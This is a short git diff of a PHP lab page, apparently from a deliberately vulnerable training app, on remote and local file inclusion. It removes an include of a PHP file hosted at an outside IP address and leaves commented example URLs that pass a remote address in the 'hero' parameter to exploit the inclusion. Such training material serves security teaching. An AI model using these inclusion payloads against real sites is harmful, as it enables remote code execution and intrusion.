@@ -1,7 +1,6 @@
 <?php
 
 #https://www.netsparker.com.tr/blog/web-guvenligi/lfi-rfi-guvenlik-zafiyetleri-baglaminda-php-stream-wrapperlari/
-#include "http://68.183.3.103/abc.php";
 
 
 include "includer.php";
@@ -83,10 +82,10 @@ if(isset($_GET["hero"])){
 <!--
 
 Level 0:
-http://localhost:8080/JotPot/remote_local_file_inclusion_rfi_lfi.php?hero=http%3A%2F%2F68.183.3.103%2Fabc.php&action=go
+http://localhost:8080/JotPot/remote_local_file_inclusion_rfi_lfi.php?hero=<http://-website-xxx.php>&action=go
 
 Level 1:
-http://localhost:8080/JotPot/remote_local_file_inclusion_rfi_lfi.php?hero=http%3A%2F%2F68.183.3.103%2Fabc&action=go
+http://localhost:8080/JotPot/remote_local_file_inclusion_rfi_lfi.php?hero=<http://-website-xxx>&action=go
 
 Level 2:
 
